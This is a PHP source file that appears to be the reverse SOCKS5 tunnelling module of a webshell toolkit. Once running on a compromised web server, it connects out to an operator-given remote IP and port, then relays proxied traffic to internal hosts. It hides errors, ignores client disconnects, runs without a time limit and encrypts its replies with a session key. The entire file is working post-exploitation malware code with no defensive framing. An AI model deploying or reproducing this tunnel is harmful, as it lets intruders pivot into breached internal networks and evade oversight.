function main($action, $remoteIP, $remotePort)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    @error_reporting(0);

    $result = array();
    if ($action == "create") {
        @session_start();
        $_SESSION["socks_running"] = true;
        session_write_close();
        ob_end_clean();
        header("Connection: close");
        ignore_user_abort();
        ob_start();
        $size = ob_get_length();
        header("Content-Length: $size");
        ob_end_flush();
        flush();
    } else if ($action == "stop") {
        @session_start();
        $_SESSION["socks_running"] = false;
        session_write_close();
        $result["status"] = base64_encode("success");
            $key = $_SESSION['k'];
            echo encrypt(json_encode($result),$key);
        return;
    }
    global $read, $outers, $targets;
    global $socketRead,$socketWrite,$socketClose,$socketSelect;
    $ready = false;
    $outers = array();
    $targets = array();
    $read = array();
    $write = array();
    $exp = array();


    $read = array_merge($targets, $outers);
    while ($_SESSION["socks_running"]) {
        if ($ready == false) {
            /*$outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            socket_connect($outterSocket, $remoteIP, intval($remotePort));
            $outers[$outterSocket] = $outterSocket;
            $ready = true;
            */
             $outtersocketObj = getSocket($remoteIP, $remotePort);
                                        $outterSocket = $outtersocketObj["s"];
                                        $s_type = $outtersocketObj["s_type"];
                                        $outers[intval($outterSocket)] = $outterSocket;



                                        $socketRead = "socket_read";
                                        $socketWrite = "socket_write";
                                        $socketClose = "socket_close";
                                        $socketSelect = "socket_select";
                                        if ($s_type == 'stream') {
                                            $socketRead = "fread";
                                            $socketWrite = "fwrite";
                                            $socketClose = "fclose";
                                            $socketSelect = "stream_select";
                                        }
                                        $ready=true;

        }
        $read = array();
        $read = array_merge($targets, $outers);

        if ($socketSelect($read, $write, $exp, null) > 0) {
            foreach ($read as $socket_item) {
                if (in_array($socket_item, $outers)) {
                    if (isset($targets[intval($socket_item)])) {
                        $content = $socketRead($socket_item, 2048);
                        if (strlen($content) == 0) {
                            unset($outers[intval($socket_item)]);
                            continue;
                        }
                        $socketWrite($targets[intval($socket_item)], $content, strlen($content));
                    } else {
                        $ready = false;
                        if (handleSocks($socket_item)) {
                        } else {
                        }
                    }
                }
                if (in_array($socket_item, $targets)) {
                    foreach ($targets as $k => $v) {
                        if ($socket_item == $v) {
                            $content = $socketRead($socket_item, 2048);
                            if (strlen($content) == 0) {
                                unset($targets[$k]);
                                continue;
                            }
                            $socketWrite($outers[$k], $content, strlen($content));
                        }
                    }
                }
            }
        }

        // 当select没有监听到可操作fd的时候，直接continue进入下一次循环
        else {
            continue;
        }
    }
}
function handleSocks($socket)
{

    global $socketRead,$socketWrite,$socketClose,$socketSelect;
    $ver = $socketRead($socket, 1);
    if ($ver == "\x05") {
        return parseSocks5($socket);
    } else if ($ver == "\x04") {
        return parseSocks4($socket);
    }
    return true;
}
function parseSocks5($socket)
{
    global $read, $outers, $targets;
    global $socketRead,$socketWrite,$socketClose,$socketSelect;
    $nmethods = $socketRead($socket, 1);
    for ($i = 0; $i < ord($nmethods); $i++) {
        $methods = $socketRead($socket, 1);
    }
    $socketWrite($socket, "\x05\x00", 2);
    $version = $socketRead($socket, 1);
    if ($version == "\x02") {
        $version = $socketRead($socket, 1);
        $cmd = $socketRead($socket, 1);
        $rsv = $socketRead($socket, 1);
        $atyp = $socketRead($socket, 1);
    } else {
        $cmd = $socketRead($socket, 1);
        $rsv = $socketRead($socket, 1);
        $atyp = $socketRead($socket, 1);
    }
    if ($atyp == "\x01") {
        $target = $socketRead($socket, 4);
        $targetPort = $socketRead($socket, 2);
        $host = inet_ntop($target);
    } else if ($atyp == "\x03") {
        $targetLen = $socketRead($socket, 1);
        $target = $socketRead($socket, $targetLen);
        $targetPort = $socketRead($socket, 2);
        $host = $target;
    } else if ($atyp == "\x04") {
        $target = $socketRead($socket, 16);
        $targetPort = $socketRead($socket, 2);
        $host = $target;
    }
    //$port=(ord($port[0]) & 0xff) * 256 + (ord($port[1]) & 0xff);
    $port = unpack("n", $targetPort)[1];
    if ($cmd == "\x02" || $cmd == "\x03") {
        throw new Exception("not implemented");
    } else if ($cmd == "\x01") {
        $host = gethostbyname($host);
        try {

            /*$targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            socket_connect($targetSocket, $host, $port);*/

            $targetSocketObj=getSocket($host, $port);
            $targetSocket=$targetSocketObj["s"];
            $targets[intval($socket)] = $targetSocket;
            $read[] = $targetSocket;

            $socketWrite($socket, "\x05\x00\x00\x01" . packAddr($host, $port));
            return true;
        } catch (Exception $e) {
            $socketWrite($socket, "\x05\x05\x00\x01");
            throw new Exception(sprintf("[%s:%d] Remote failed", $host, $port));
        }
    } else {
        throw new Exception("Socks5 - Unknown CMD");
    }
}
function parseSocks4($socket)
{
    return false;
}
function packAddr($host, $port)
{
    $tmp = explode('.', $host);
    foreach ($tmp as $block) {
        $data .= chr($block);
    }
    $data .= pack("n", $port);
    return $data;
}
function encrypt($data, $key)
{
    if (!extension_loaded('openssl')) {
        for ($i = 0; $i < strlen($data); $i++) {
            $data[$i] = $data[$i] ^ $key[$i + 1 & 15];
        }
        return $data;
    } else {
        return openssl_encrypt($data, "AES128", $key);
    }
}
function getSocket($ip, $port)
{
    $resultObj=array();
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    }
    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port);
        $s_type = 'stream';
    }
    if (!$s && ($f = 'socket_create') && is_callable($f)) {
        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    }
    if (!$s_type) {
        $s_type="error";
        $s='no socket funcs';
    }
    if (!$s) {
        $s_type="error";
        $s='no socket';
    }
    $resultObj["s"]=$s;
    $resultObj["s_type"]=$s_type;
    return $resultObj;
}

